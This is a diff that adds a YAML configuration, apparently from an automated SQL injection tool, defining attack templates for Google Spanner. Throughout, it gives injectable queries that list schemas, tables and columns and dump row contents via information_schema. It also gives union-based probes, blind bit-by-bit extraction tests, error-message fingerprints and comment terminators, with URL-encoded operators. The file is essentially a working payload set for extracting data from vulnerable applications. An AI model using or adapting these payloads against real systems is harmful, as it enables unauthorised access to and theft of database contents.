@@ -1,0 +1,163 @@
+engine: Spanner
+
+resource:
+ info: |
+  concat(
+      'version()',
+      '${enclose_value_sql}',
+      'current_database()',
+      '${enclose_value_sql}',
+      'user'
+  )
+
+ schema:
+  database: |
+   select
+       array_to_string(
+           array(
+               select concat(
+                   '${enclose_value_sql}',
+                   r,
+                   '${separator_qte_sql}',
+                   cast(q as string),
+                   '${enclose_value_sql}'
+               ) from (
+                   select
+                       tables.table_schema r,
+                       count(table_name) q
+                   from information_schema.tables
+                   group by r
+                   order by r
+                   ${limit}
+               ) x
+           ),
+           '${separator_cell_sql}'
+       )
+
+  table: |
+   select
+       array_to_string(
+           array(
+               select concat(
+                   '${enclose_value_sql}',
+                   r,
+                   '${separator_qte_sql}',
+                   cast(q as string),
+                   '${enclose_value_sql}'
+               ) from (
+                   select
+                       tables.table_name r,
+                       '0' q
+                   from information_schema.tables
+                   where tables.table_schema = '${database}'
+                   order by r
+                   ${limit}
+               ) x
+           ),
+           '${separator_cell_sql}'
+       )
+
+  column: |
+   select
+       array_to_string(
+           array(
+               select concat(
+                   '${enclose_value_sql}',
+                   r,
+                   '${separator_qte_sql}',
+                   cast(q as string),
+                   '${enclose_value_sql}'
+               ) from (
+                   select
+                       columns.column_name r,
+                       '0' q
+                   from information_schema.columns
+                   where columns.table_schema = '${database}'
+                   and columns.table_name = '${table}'
+                   order by r
+                   ${limit}
+               )x
+           ),
+           '${separator_cell_sql}'
+       )
+
+  row:
+   query: |
+    select
+        array_to_string(
+            array(
+               select concat(
+                   '${enclose_value_sql}',
+                   r,
+                   '${separator_qte_sql}',
+                   cast(q as string),
+                   '${enclose_value_sql}'
+               ) from (
+                    select
+                        substr(concat(${fields}), 1, 775) r,
+                        count(*) q
+                    from ${database}.${table}
+                    group by r
+                    ${limit}
+                )x
+            ),
+            '${separator_cell_sql}'
+        )
+   fields:
+    field: trim(coalesce(cast(${field.value} as string), ''))
+    concat: ", '%7f',"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   select concat(
+       '${lead}',
+       coalesce(
+           substr(
+               (${injection}),
+               ${window.char},
+               65536
+           ),
+           ''
+       ),
+       '${trail_sql}'
+   )
+  limit: limit 65536 offset ${limit.value}
+  failsafe: cast((1337${indice}7330%2b1) as string)
+  calibrator: repeat('${calibrator_sql}', 1024)
+  limitBoundary: 0
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - spanner
+   orderByErrorMessage:
+    - "(?<!Vertica.*)ERROR: ORDER BY position 1337 is not in select list"
+   engineSpecific: case when ${test} then array_length([])else 1 end=0
+
+ union:
+  indices: union all select ${indices}
+  capacity: (select concat('${lead}', '${indice}', ${calibrator}))
+  orderBy: order by 1337
+
+ binary:
+  test:
+   bit: |
+    0 != bit_and(
+        ascii(substr(
+            ${injection},
+            ${window.char},
+            1
+        )),
+        ${bit}
+    )
+   # engine uses collations for char comparison, not ascii, forcing ascii comparison
+   bin: |
+    substr(
+        (${injection}),
+        ${window.char},
+        1
+    )
+    %3E%3Dchr(${mid.int})
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
